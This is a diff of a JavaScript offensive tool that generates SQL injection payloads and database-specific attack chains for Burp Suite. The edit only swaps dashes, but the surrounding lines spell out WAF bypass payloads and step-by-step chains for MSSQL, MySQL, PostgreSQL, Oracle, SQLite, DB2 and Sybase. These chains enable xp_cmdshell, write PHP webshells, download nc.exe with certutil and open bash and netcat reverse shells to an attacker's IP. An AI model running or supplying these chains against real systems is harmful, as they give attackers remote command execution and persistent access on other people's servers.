@@ -2175,7 +2175,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
   // ── WAF BYPASS ────────────────────────────────────
   if (techs.includes('bypass')) {
     all.push({
-      id:'waf-bypass-space', title:'WAF bypass — space substitutes (most common WAF filter)',
+      id:'waf-bypass-space', title:'WAF bypass - space substitutes (most common WAF filter)',
       db:['mssql','mysql','pg','oracle','sqlite'],
       tech:['bypass'], ctx:['post','get','json','header','cookie'],
       payload: () => `'/**/OR/**/1=1--\n'%09OR%091=1--\n'%0aOR%0a1=1--\n'%0dOR%0d1=1--\n'%0bOR%0b1=1--\n'%0cOR%0c1=1--\n'+OR+1=1--\nSELECT/**/1/**/FROM/**/users/**/WHERE/**/1=1--\n'/*!OR*/1=1--\n'%23%0aOR%231=1--`,
@@ -2183,7 +2183,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     });
 
     all.push({
-      id:'waf-bypass-keywords', title:'WAF bypass — keyword obfuscation (UNION/SELECT/WHERE blocked)',
+      id:'waf-bypass-keywords', title:'WAF bypass - keyword obfuscation (UNION/SELECT/WHERE blocked)',
       db:['mssql','mysql','pg','oracle','sqlite'],
       tech:['bypass'], ctx:['post','get','json'],
       payload: () => `-- Case variation:\nUnIoN SeLeCt 1,2,3--\nuNiOn%20sElEcT%201,2,3--\n\n-- MySQL version comment (strips comment, leaves keyword):\n' UNION/*!SELECT*/1,2,3--\n'/*!UNION*//*!SELECT*/1,2,3--\n'/*!50000UNION*//*!50000SELECT*/1,2,3--\n\n-- MSSQL char concat in EXEC:\n'; EXEC('sel'+'ect 1')--\n'; EXEC('xp_'+'cmdshell ''id''')--\n\n-- Scientific notation confusion:\n' UNION SELECT 1e0,2e0,3e0--\n\n-- Buffer overflow some WAF regex:\n' AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 AND 1=1 OR 1=1--`,
@@ -2191,7 +2191,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     });
 
     all.push({
-      id:'waf-bypass-encoding', title:'WAF bypass — encoding tricks (quote / char / hex)',
+      id:'waf-bypass-encoding', title:'WAF bypass - encoding tricks (quote / char / hex)',
       db:['mssql','mysql','pg','sqlite'],
       tech:['bypass'], ctx:['post','get','json'],
       payload: () => `-- URL double-encoding (WAF decodes once, app decodes twice):\n%2527  →  %27  →  '\n%2522  →  %22  →  "\n\n-- MySQL hex string (no quotes needed):\n' UNION SELECT 1,0x61646d696e,3--      (0x61646d696e = 'admin')\n' WHERE username=0x61646d696e--\n\n-- MSSQL CHAR() concat:\n' UNION SELECT CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)--\n\n-- Unicode normalisation (some WAFs normalise to ASCII after check):\n' ＯＲ 1=1--    (fullwidth chars U+FF2F U+FF32)\n\n-- Null byte injection (terminates some WAF string matching):\n'%00 OR 1=1--\n' OR%001=1--\n\n-- Multipart boundary confusion:\n-- Content-Disposition: form-data; name="user\\r\\n\\r\\nINJECT"`,
@@ -2199,7 +2199,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     });
 
     all.push({
-      id:'waf-bypass-http', title:'WAF bypass — HTTP-level tricks (param pollution, chunked, headers)',
+      id:'waf-bypass-http', title:'WAF bypass - HTTP-level tricks (param pollution, chunked, headers)',
       db:['mssql','mysql','pg','oracle','sqlite'],
       tech:['bypass'], ctx:['post','get','header'],
       payload: () => `-- HTTP Parameter Pollution (HPP):\nGET /search?q=safe&q=' OR 1=1--\nPOST body: user=safe&user=' OR 1=1--\n\n-- Method override (some WAFs only inspect POST):\nPOST with header: X-HTTP-Method-Override: GET\n\n-- Chunked Transfer Encoding (splits payload across chunks):\nTransfer-Encoding: chunked\n3\n' O\n3\nR 1\n4\n=1--\n0\n\n-- Path confusion:\nGET /login%2F..%2F..%2F?user=' OR 1=1--\n\n-- Sending payload in unused but logged headers:\nX-Forwarded-For: ' OR 1=1--\nReferer: http://x/' OR 1=1--\nUser-Agent: ' OR 1=1--\nX-Real-IP: ' OR 1=1--`,
@@ -2210,7 +2210,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
   // ── INJECTION CONTEXT: HEADERS ─────────────────
   if (ctxs.includes('header')) {
     all.push({
-      id:'ctx-headers', title:'HTTP header injection contexts — blind/OOB suited',
+      id:'ctx-headers', title:'HTTP header injection contexts - blind/OOB suited',
       db:['mssql','mysql','pg','oracle','sqlite'],
       tech:['blind','err','oob'], ctx:['header'],
       payload: () => `X-Forwarded-For: ' OR 1=1--\nX-Forwarded-For: 1' AND SLEEP(5)--\nX-Forwarded-For: 127.0.0.1' UNION SELECT NULL,@@version,NULL--\n\nUser-Agent: Mozilla' OR 1=1--\nUser-Agent: ' UNION SELECT 1,2,3--\n\nReferer: http://target/' AND 1=1--\nReferer: http://target/' UNION SELECT 1,2,3--\n\nX-Custom-IP-Authorization: 127.0.0.1' OR 1=1--\n\nCookie: session=abc' AND 1=1--\nCookie: user=admin'--`,
@@ -2220,7 +2220,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
   if (ctxs.includes('json')) {
     all.push({
-      id:'ctx-json', title:'JSON body injection — REST API contexts',
+      id:'ctx-json', title:'JSON body injection - REST API contexts',
       db:['mssql','mysql','pg','sqlite'],
       tech:['blind','err','union'], ctx:['json'],
       payload: () => `{"username":"admin' AND 1=1--","password":"x"}\n{"username":"admin'/**/AND/**/1=1--","password":"x"}\n{"username":"' OR '1'='1","password":"x"}\n{"id":"1 AND 1=1"}\n{"search":"x' UNION SELECT 1,version(),3--"}\n\n-- nested path:\n{"user":{"name":"admin' AND 1=1--"}}\n{"filter":{"field":"name","value":"' OR 1=1--"}}\n\n-- array context:\n{"ids":["1","2' OR 1=1--"]}`,
@@ -2331,7 +2331,7 @@ function renderPayloads(payloads) {
   // polyglots (4+ DBs, not second-order)
   const poly = payloads.filter(p => p.db.length >= 4 && !p.tech.includes('second'));
   if (poly.length) {
-    html += `<div class="stage-divider"><span>◈ polyglot — works across all / most DBs</span></div>`;
+    html += `<div class="stage-divider"><span>◈ polyglot - works across all / most DBs</span></div>`;
     poly.forEach(p => html += renderCard(p));
   }
 
@@ -2382,7 +2382,7 @@ function renderCard(p) {
       <pre id="pre-${p.id}">${escaped}</pre>
     </div>`;
   } else if (currentFmt === 'intruder') {
-    // Intruder mode — show stripped clean lines, numbered
+    // Intruder mode - show stripped clean lines, numbered
     const lines = p.intruderLines;
     const lineHtml = lines.length
       ? lines.map((l, i) => `<span class="intruder-line"><span class="intruder-index">${i+1}.</span>${escHtml(l)}</span>`).join('')
@@ -2396,7 +2396,7 @@ function renderCard(p) {
       <div class="intruder-block" id="pre-${p.id}">${lineHtml}</div>
     </div>`;
   } else {
-    // Burp Repeater mode — full HTTP request
+    // Burp Repeater mode - full HTTP request
     const burpLines = p.burpReq.split('\r\n');
     const burpHtml  = burpLines.map((line, i) => {
       if (!line) return '';
@@ -2413,7 +2413,7 @@ function renderCard(p) {
 
     body = `<div class="pblock">
       <div class="pblock-label">
-        <span class="pill pill-blue">Burp Repeater — paste raw request</span>
+        <span class="pill pill-blue">Burp Repeater - paste raw request</span>
         <span style="color:var(--text-dim);font-size:10px">Repeater → Raw tab → Ctrl+A, Ctrl+V → Send</span>
       </div>
       <pre id="pre-${p.id}" style="font-size:10.5px">${burpHtml}</pre>
@@ -2489,7 +2489,7 @@ function escHtml(s) {
 }
 
 // ═══════════════════════════════════════════════════════
-// ATTACK CHAIN RENDERER — two delivery modes
+// ATTACK CHAIN RENDERER - two delivery modes
 // ═══════════════════════════════════════════════════════
 let chainMode = 'ps'; // 'ps' | 'certutil' (MSSQL sub-modes)
 let chainDb   = 'mssql'; // 'mssql' | 'mysql' | 'pg' | 'oracle'
@@ -2522,39 +2522,39 @@ function renderChain() {
   if (activeDBs.length === 1) chainDb = activeDBs[0];
 
   // ── COMMON HELPERS ──────────────────────────────────────
-  const TIMING_MSSQL = { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection — MSSQL WAITFOR (5s)', note:'Response delayed ≥5s = stacked queries confirmed.', inject:`'; WAITFOR DELAY '0:0:5';--`, hint:'~5s delay = injectable.' };
-  const TIMING_MYSQL = { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection — MySQL SLEEP (5s)', note:'Response delayed ≥5s = stacked queries work.',         inject:`'; SELECT SLEEP(5);--`,              hint:'~5s delay = injectable.' };
-  const TIMING_PG    = { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection — PG pg_sleep (3s)',  note:'Response delayed ≥3s = injection confirmed.',          inject:`' AND 1=(SELECT 1 FROM pg_sleep(3))--`, hint:'~3s delay = injectable.' };
-  const TIMING_ORA   = { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection — Oracle DBMS_PIPE (3s)', note:'Response delayed ≥3s = injection confirmed.',      inject:`' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)--`, hint:'~3s delay = injectable.' };
+  const TIMING_MSSQL = { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection - MSSQL WAITFOR (5s)', note:'Response delayed ≥5s = stacked queries confirmed.', inject:`'; WAITFOR DELAY '0:0:5';--`, hint:'~5s delay = injectable.' };
+  const TIMING_MYSQL = { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection - MySQL SLEEP (5s)', note:'Response delayed ≥5s = stacked queries work.',         inject:`'; SELECT SLEEP(5);--`,              hint:'~5s delay = injectable.' };
+  const TIMING_PG    = { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection - PG pg_sleep (3s)',  note:'Response delayed ≥3s = injection confirmed.',          inject:`' AND 1=(SELECT 1 FROM pg_sleep(3))--`, hint:'~3s delay = injectable.' };
+  const TIMING_ORA   = { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection - Oracle DBMS_PIPE (3s)', note:'Response delayed ≥3s = injection confirmed.',      inject:`' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)--`, hint:'~3s delay = injectable.' };
 
   let steps, setupBlocks, modeName, dbLabel;
 
   // ── MSSQL CHAINS ───────────────────────────────────────
   if (chainDb === 'mssql') {
     const STEP0  = { badge:'STEP 0',   badgeClass:'badge-info', title:'Confirm stacked queries (5s timing)', note:'≥5s delay = stacked queries work = proceed.', inject:`'; WAITFOR DELAY '0:0:5';--`, hint:'~5s HTTP delay = confirmed injectable.' };
-    const STEP1  = { badge:'STEP 1',   badgeClass:'badge-ok',   title:'Enable xp_cmdshell', note:'One-time. Safe to re-run. Requires SA / sysadmin.', inject:`'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--`, hint:'No output — blind. Normal response expected.' };
+    const STEP1  = { badge:'STEP 1',   badgeClass:'badge-ok',   title:'Enable xp_cmdshell', note:'One-time. Safe to re-run. Requires SA / sysadmin.', inject:`'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--`, hint:'No output - blind. Normal response expected.' };
     const STEP15 = { badge:'STEP 1.5', badgeClass:'badge-info', title:'Verify xp_cmdshell (ping timing)', note:'ping -n 6 takes ~5s. Optional.', inject:`'; EXEC xp_cmdshell 'ping -n 6 127.0.0.1';--`, hint:'~5s delay = xp_cmdshell live.' };
     dbLabel = 'MSSQL / SQL Server';
     if (chainMode === 'ps') {
-      modeName = 'PowerShell -enc — no file server needed';
-      steps = [ STEP0, STEP1, STEP15, { badge:'STEP 2', badgeClass:'badge-fire', title:`PS -enc reverse shell → ${ip}:${port}`, note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code>`, inject:`'; EXEC xp_cmdshell 'wmic process call create "powershell -nop -w hidden -enc ${psB64}"';--`, hint:'wmic spawns PS under WmiPrvSE.exe — outside SQL job object — xp_cmdshell returns immediately, shell connects.' } ];
+      modeName = 'PowerShell -enc - no file server needed';
+      steps = [ STEP0, STEP1, STEP15, { badge:'STEP 2', badgeClass:'badge-fire', title:`PS -enc reverse shell → ${ip}:${port}`, note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code>`, inject:`'; EXEC xp_cmdshell 'wmic process call create "powershell -nop -w hidden -enc ${psB64}"';--`, hint:'wmic spawns PS under WmiPrvSE.exe - outside SQL job object - xp_cmdshell returns immediately, shell connects.' } ];
       setupBlocks = [ { label:'① nc listener (keep open before Step 2)', cmd:`nc -lvnp ${port}`, id:'chain-setup-nc' } ];
     } else {
-      modeName = 'certutil + nc.exe — PS policy blocked';
+      modeName = 'certutil + nc.exe - PS policy blocked';
       steps = [ STEP0, STEP1, STEP15,
-        { badge:'STEP 2', badgeClass:'badge-warn', title:`Download nc.exe via certutil`, note:`<b>Before sending:</b> start file server — see Kali setup.`, inject:`'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://${ip}:${hp}/nc.exe %TEMP%\\nc.exe';--`, hint:'Watch HTTP log for GET /nc.exe.' },
-        { badge:'STEP 3', badgeClass:'badge-fire', title:`Execute nc.exe → ${ip}:${port}`, note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code>`, inject:`'; EXEC xp_cmdshell 'wmic process call create "cmd /c %TEMP%\\nc.exe ${ip} ${port} -e cmd.exe"';--`, hint:'wmic spawns nc.exe under WmiPrvSE.exe — outside SQL job object — connection survives Intruder timeout.' }
+        { badge:'STEP 2', badgeClass:'badge-warn', title:`Download nc.exe via certutil`, note:`<b>Before sending:</b> start file server - see Kali setup.`, inject:`'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://${ip}:${hp}/nc.exe %TEMP%\\nc.exe';--`, hint:'Watch HTTP log for GET /nc.exe.' },
+        { badge:'STEP 3', badgeClass:'badge-fire', title:`Execute nc.exe → ${ip}:${port}`, note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code>`, inject:`'; EXEC xp_cmdshell 'wmic process call create "cmd /c %TEMP%\\nc.exe ${ip} ${port} -e cmd.exe"';--`, hint:'wmic spawns nc.exe under WmiPrvSE.exe - outside SQL job object - connection survives Intruder timeout.' }
       ];
       setupBlocks = [
-        { label:'① File server — serve nc.exe', cmd:`cp /usr/share/windows-binaries/nc.exe /tmp/ 2>/dev/null || locate nc.exe | grep -i win | head -1 | xargs -I{} cp {} /tmp/nc.exe\ncd /tmp && python3 -m http.server ${hp}`, id:'chain-setup-fs' },
+        { label:'① File server - serve nc.exe', cmd:`cp /usr/share/windows-binaries/nc.exe /tmp/ 2>/dev/null || locate nc.exe | grep -i win | head -1 | xargs -I{} cp {} /tmp/nc.exe\ncd /tmp && python3 -m http.server ${hp}`, id:'chain-setup-fs' },
         { label:'② nc listener (keep open before Step 3)', cmd:`nc -lvnp ${port}`, id:'chain-setup-nc' }
       ];
     }
 
-  // ── MYSQL CHAIN (general_log — bypasses secure_file_priv) ──
+  // ── MYSQL CHAIN (general_log - bypasses secure_file_priv) ──
   } else if (chainDb === 'mysql') {
     dbLabel  = 'MySQL / MariaDB';
-    modeName = 'general_log webshell — bypasses secure_file_priv';
+    modeName = 'general_log webshell - bypasses secure_file_priv';
     const targetUrl = turl;
     const targetForCurl = `http://${thost}${targetUrl.replace(/\/[^/]*\.aspx$/,'/sh.php').replace(/\/[^/]*$/,'/sh.php')}`;
     steps = [
@@ -2562,10 +2562,10 @@ function renderChain() {
       { badge:'STEP 1', badgeClass:'badge-ok',   title:'Enable general_log + redirect to web root', note:'Requires SUPER or SYSTEM_VARIABLES_ADMIN. Single stacked inject.',
         inject:`'; SET GLOBAL general_log='on'; SET GLOBAL general_log_file='/var/www/html/sh.php';--`, hint:'No output. Sets log file path to PHP web root.' },
       { badge:'STEP 2', badgeClass:'badge-warn',  title:'Write PHP webshell to log file',            note:'The query text appears verbatim in the log file.',
-        inject:`'; SELECT '<?php system($_GET[c]);?>';--`, hint:'Creates /var/www/html/sh.php — verify: curl http://TARGET/sh.php?c=id' },
-      { badge:'STEP 3', badgeClass:'badge-fire',  title:'Trigger reverse shell via webshell',        note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code> — then send this inject OR run curl on Kali.`,
+        inject:`'; SELECT '<?php system($_GET[c]);?>';--`, hint:'Creates /var/www/html/sh.php - verify: curl http://TARGET/sh.php?c=id' },
+      { badge:'STEP 3', badgeClass:'badge-fire',  title:'Trigger reverse shell via webshell',        note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code> - then send this inject OR run curl on Kali.`,
         inject:`'; SELECT '<?php system("bash -c \\"bash -i >& /dev/tcp/${ip}/${port} 0>&1\\"");?>';--`, hint:`Or run on Kali: curl "${targetForCurl}?c=bash+-c+'bash+-i+>%26+/dev/tcp/${ip}/${port}+0>%261'"` },
-      { badge:'STEP 4', badgeClass:'badge-info',  title:'Cleanup — restore general_log',             note:'Restore original state.',
+      { badge:'STEP 4', badgeClass:'badge-info',  title:'Cleanup - restore general_log',             note:'Restore original state.',
         inject:`'; SET GLOBAL general_log='off'; SET GLOBAL general_log_file='';--`, hint:'Restored. Check: SELECT @@general_log_file.' }
     ];
     setupBlocks = [
@@ -2573,14 +2573,14 @@ function renderChain() {
       { label:'② Verify webshell after Step 2 (run on Kali)', cmd:`curl "http://${thost}/sh.php?c=id"`, id:'chain-setup-verify' }
     ];
 
-  // ── POSTGRESQL CHAIN (COPY TO PROGRAM — simplest) ──────
+  // ── POSTGRESQL CHAIN (COPY TO PROGRAM - simplest) ──────
   } else if (chainDb === 'pg') {
     dbLabel  = 'PostgreSQL';
-    modeName = 'COPY TO PROGRAM — single inject, superuser required';
+    modeName = 'COPY TO PROGRAM - single inject, superuser required';
     steps = [
       TIMING_PG,
       { badge:'STEP 1', badgeClass:'badge-fire', title:`COPY TO PROGRAM → bash reverse shell → ${ip}:${port}`,
-        note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code> — then send this. One request = shell.`,
+        note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code> - then send this. One request = shell.`,
         inject:`'; COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"';--`,
         hint:'nc catches bash shell immediately.' },
       { badge:'ALT 1', badgeClass:'badge-info', title:'Alt: mkfifo nc pipe (if bash not available)',
@@ -2593,39 +2593,39 @@ function renderChain() {
         hint:'Full Python inside PG. Powerful.' }
     ];
     setupBlocks = [
-      { label:'① nc listener (start before Step 1 — one inject = shell)', cmd:`nc -lvnp ${port}`, id:'chain-setup-nc' }
+      { label:'① nc listener (start before Step 1 - one inject = shell)', cmd:`nc -lvnp ${port}`, id:'chain-setup-nc' }
     ];
 
   // ── ORACLE CHAIN (DBMS_SCHEDULER) ──────────────────────
   } else if (chainDb === 'oracle') {
     dbLabel  = 'Oracle DB';
-    modeName = 'DBMS_SCHEDULER EXECUTABLE — Oracle 10g+, no Java needed';
+    modeName = 'DBMS_SCHEDULER EXECUTABLE - Oracle 10g+, no Java needed';
     steps = [
       TIMING_ORA,
       { badge:'STEP 1', badgeClass:'badge-fire', title:`DBMS_SCHEDULER → bash reverse shell → ${ip}:${port}`,
-        note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code> — job fires async within seconds.`,
+        note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code> - job fires async within seconds.`,
         inject:`'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'J1',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>3,enabled=>FALSE,auto_drop=>TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1',1,'-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1',2,'bash -i >& /dev/tcp/${ip}/${port} 0>&1'); DBMS_SCHEDULER.ENABLE('J1'); END;--`,
         hint:'nc catches shell within ~2s of sending.' },
       { badge:'ALT 1', badgeClass:'badge-info', title:'Alt: Java stored procedure (if Java enabled)',
         note:'Check: SELECT * FROM v$option WHERE PARAMETER=\'Java\' AND VALUE=\'TRUE\';',
         inject:`'; SELECT os_cmd('bash -i >& /dev/tcp/${ip}/${port} 0>&1') FROM dual;--`,
-        hint:'Requires os_cmd function to be created first — see Java RCE payload card.' },
-      { badge:'CLEANUP', badgeClass:'badge-info', title:'Cleanup — drop scheduler job',
+        hint:'Requires os_cmd function to be created first - see Java RCE payload card.' },
+      { badge:'CLEANUP', badgeClass:'badge-info', title:'Cleanup - drop scheduler job',
         note:'Always clean up after exploit.',
         inject:`'; BEGIN DBMS_SCHEDULER.DROP_JOB('J1'); END;--`,
         hint:'Job removed. Verify: SELECT job_name FROM dba_scheduler_jobs WHERE job_name=\'J1\'.' }
     ];
     setupBlocks = [
-      { label:'① nc listener (start before Step 1 — fires async)', cmd:`nc -lvnp ${port}`, id:'chain-setup-nc' }
+      { label:'① nc listener (start before Step 1 - fires async)', cmd:`nc -lvnp ${port}`, id:'chain-setup-nc' }
     ];
 
   // ── SQLITE CHAIN (ATTACH DATABASE webshell) ────────
   } else if (chainDb === 'sqlite') {
     dbLabel  = 'SQLite';
-    modeName = 'ATTACH DATABASE webshell — no special privs, works in default SQLite builds';
+    modeName = 'ATTACH DATABASE webshell - no special privs, works in default SQLite builds';
     const sqliteWebshellUrl = `http://${thost}${turl.replace(/\/[^/]*$/,'/sh.php')}`;
     steps = [
-      { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection — CPU burn timing (~3s)',
+      { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm blind injection - CPU burn timing (~3s)',
         note:'SQLite has no SLEEP(). randomblob CPU burn confirms injection.',
         inject:`' AND 1=(SELECT LIKE('ABCDE',randomblob(500000000/2)))--`,
         hint:'~3s delay = injectable.' },
@@ -2634,11 +2634,11 @@ function renderChain() {
         inject:`'; ATTACH DATABASE '/var/www/html/sh.php' AS pwn;--`,
         hint:'No output. File created at /var/www/html/sh.php.' },
       { badge:'STEP 2', badgeClass:'badge-warn', title:'Write PHP webshell into attached DB via INSERT',
-        note:'Table row content appears as raw bytes in the SQLite file — PHP reads it as code.',
+        note:'Table row content appears as raw bytes in the SQLite file - PHP reads it as code.',
         inject:`'; CREATE TABLE pwn.x (y TEXT); INSERT INTO pwn.x VALUES ('<?php system($_GET[c]);?>');--`,
         hint:`Verify: curl "${sqliteWebshellUrl}?c=id"` },
       { badge:'STEP 3', badgeClass:'badge-fire', title:`Trigger reverse shell via webshell → ${ip}:${port}`,
-        note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code> — then run curl on Kali.`,
+        note:`<b>⚠ Start listener FIRST:</b> <code>nc -lvnp ${port}</code> - then run curl on Kali.`,
         inject:`'; INSERT INTO pwn.x VALUES ('<?php system("bash -c \\"bash -i >& /dev/tcp/${ip}/${port} 0>&1\\"");?>');--`,
         hint:`Or from Kali: curl "${sqliteWebshellUrl}?c=bash+-c+'bash+-i+>%26+/dev/tcp/${ip}/${port}+0>%261'"` }
     ];
@@ -2650,7 +2650,7 @@ function renderChain() {
   // ── H2 CHAIN (CREATE ALIAS Java RCE) ───────────────
   } else if (chainDb === 'h2') {
     dbLabel  = 'H2 / HSQLDB';
-    modeName = 'CREATE ALIAS Java RCE — no binary upload, in-process JVM execution';
+    modeName = 'CREATE ALIAS Java RCE - no binary upload, in-process JVM execution';
     steps = [
       { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm H2 stacked queries + version fingerprint',
         note:'H2 error-based: CAST to INT leaks value in exception. If error visible in response, confirms injectable.',
@@ -2676,14 +2676,14 @@ function renderChain() {
   // ── DB2 CHAIN (ADMIN_CMD shell) ─────────────────────
   } else if (chainDb === 'db2') {
     dbLabel  = 'IBM DB2';
-    modeName = 'ADMIN_CMD OS execution — requires SYSADM/DBADM, Linux and Windows';
+    modeName = 'ADMIN_CMD OS execution - requires SYSADM/DBADM, Linux and Windows';
     steps = [
       { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm stacked queries + DB2 timing (recursive CTE ~5s)',
         note:'DB2 has no SLEEP(). Recursive CTE CPU delay confirms stacked queries.',
         inject:`' AND 1=(WITH r(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM r WHERE n<9999999) SELECT COUNT(*) FROM r)--`,
         hint:'~5s delay = DB2 stacked queries confirmed.' },
       { badge:'STEP 1', badgeClass:'badge-ok', title:'Confirm ADMIN_CMD is available (whoami)',
-        note:'ADMIN_CMD requires SYSADM. Output is blind — timing only.',
+        note:'ADMIN_CMD requires SYSADM. Output is blind - timing only.',
         inject:`'; CALL SYSPROC.ADMIN_CMD('! id > /tmp/id.txt');--`,
         hint:'No output. Check /tmp/id.txt if readable.' },
       { badge:'STEP 2', badgeClass:'badge-fire', title:`ADMIN_CMD bash reverse shell → ${ip}:${port}`,
@@ -2691,7 +2691,7 @@ function renderChain() {
         inject:`'; CALL SYSPROC.ADMIN_CMD('! bash -i >& /dev/tcp/${ip}/${port} 0>&1');--`,
         hint:'nc catches bash shell.' },
       { badge:'ALT', badgeClass:'badge-warn', title:`Windows DB2: certutil + nc.exe`,
-        note:`Windows target — use certutil drop instead. Start file server: python3 -m http.server ${hp}`,
+        note:`Windows target - use certutil drop instead. Start file server: python3 -m http.server ${hp}`,
         inject:`'; CALL SYSPROC.ADMIN_CMD('! powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(''http://${ip}:${hp}/s.ps1'')"');--`,
         hint:'Serve Invoke-PowerShellTcp.ps1 from Kali.' }
     ];
@@ -2699,19 +2699,19 @@ function renderChain() {
       { label:'① nc listener (start before Step 2)', cmd:`nc -lvnp ${port}`, id:'chain-setup-nc' }
     ];
 
-  // ── SYBASE CHAIN (xp_cmdshell — identical to MSSQL) ──
+  // ── SYBASE CHAIN (xp_cmdshell - identical to MSSQL) ──
   } else if (chainDb === 'sybase') {
     dbLabel  = 'Sybase / SAP ASE';
-    modeName = 'xp_cmdshell — identical approach to MSSQL, requires sa privileges';
+    modeName = 'xp_cmdshell - identical approach to MSSQL, requires sa privileges';
     steps = [
-      { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm stacked queries — WAITFOR 5s',
+      { badge:'STEP 0', badgeClass:'badge-info', title:'Confirm stacked queries - WAITFOR 5s',
         note:'Sybase WAITFOR DELAY is identical to MSSQL.',
         inject:`'; WAITFOR DELAY '0:0:5';--`,
         hint:'~5s delay = stacked queries confirmed.' },
       { badge:'STEP 1', badgeClass:'badge-ok', title:'Enable xp_cmdshell (if disabled)',
         note:'Requires sa. sp_configure xp_cmdshell value 1.',
         inject:`'; EXEC sp_configure 'xp_cmdshell',1;--`,
-        hint:'No output — blind. Normal response expected.' },
+        hint:'No output - blind. Normal response expected.' },
       { badge:'STEP 1.5', badgeClass:'badge-info', title:'Verify xp_cmdshell (ping timing)',
         note:'ping -c 5 takes ~5s. Optional verification.',
         inject:`'; EXEC xp_cmdshell 'ping -c 5 127.0.0.1';--`,
@@ -2721,9 +2721,9 @@ function renderChain() {
         inject:`'; EXEC xp_cmdshell 'bash -i >& /dev/tcp/${ip}/${port} 0>&1';--`,
         hint:'nc catches bash shell.' },
       { badge:'ALT', badgeClass:'badge-warn', title:`Windows Sybase: nc.exe via certutil drop`,
-        note:`Windows ASE — serve nc.exe from Kali HTTP server on port ${hp}.`,
+        note:`Windows ASE - serve nc.exe from Kali HTTP server on port ${hp}.`,
         inject:`'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://${ip}:${hp}/nc.exe %TEMP%\\nc.exe && wmic process call create "cmd /c %TEMP%\\nc.exe ${ip} ${port} -e cmd.exe"';--`,
-        hint:'wmic spawns nc.exe under WmiPrvSE.exe — outside SQL job object — connection survives Intruder timeout.' }
+        hint:'wmic spawns nc.exe under WmiPrvSE.exe - outside SQL job object - connection survives Intruder timeout.' }
     ];
     setupBlocks = [
       { label:'① nc listener (start before Step 2)', cmd:`nc -lvnp ${port}`, id:'chain-setup-nc' },
@@ -2806,17 +2806,17 @@ function renderChain() {
     </div>
 
     <div class="chain-section">
-      <div class="chain-section-label">// kali setup — run before the attack</div>
+      <div class="chain-section-label">// kali setup - run before the attack</div>
       ${setupBlocks.map(kaliBlock).join('')}
     </div>
 
     <div class="chain-section">
-      <div class="chain-section-label">// attack sequence — send each step to Burp Repeater in order</div>
+      <div class="chain-section-label">// attack sequence - send each step to Burp Repeater in order</div>
       ${steps.map(stepBlock).join('')}
     </div>
 
     <div class="chain-section">
-      <div class="chain-section-label">// intruder wordlist — all payloads in order (Sniper mode)</div>
+      <div class="chain-section-label">// intruder wordlist - all payloads in order (Sniper mode)</div>
       <div class="chain-kali-block">
         <div class="chain-kali-header">
           <span class="chain-kali-label">Paste into Intruder → Payloads → send in sequence</span>
@@ -2895,7 +2895,7 @@ function buildShells(ip, port, hp, shells, webshells) {
     const raw = `bash -i >& /dev/tcp/${H}/${P} 0>&1`;
     const rawWrapped = `(bash >& /dev/tcp/${H}/${P} 0>&1) &`;
     cards.push({
-      id:'sh-bash', title:'Bash — /dev/tcp reverse shell',
+      id:'sh-bash', title:'Bash - /dev/tcp reverse shell',
       platform: 'linux',
       variants: [
         { label:'raw (inline)',            cmd: raw },
@@ -2913,7 +2913,7 @@ function buildShells(ip, port, hp, shells, webshells) {
     const mkfifo   = `(rm /tmp/_s;mkfifo /tmp/_s;cat /tmp/_s|sh 2>&1|nc ${H} ${P} >/tmp/_s) >/dev/null 2>&1 &`;
